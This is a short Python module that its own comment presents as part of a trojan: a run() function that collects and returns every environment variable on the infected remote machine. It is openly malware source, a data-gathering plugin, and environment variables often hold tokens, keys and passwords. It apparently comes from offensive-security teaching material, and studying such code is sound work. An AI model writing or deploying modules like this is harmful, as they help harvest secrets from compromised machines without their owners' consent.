#retrieves any environment variables that are set on the remote machine on which the trojan is executing

import os

def run(**args):
    print("[*] Running environment module")
    return str(os.environ)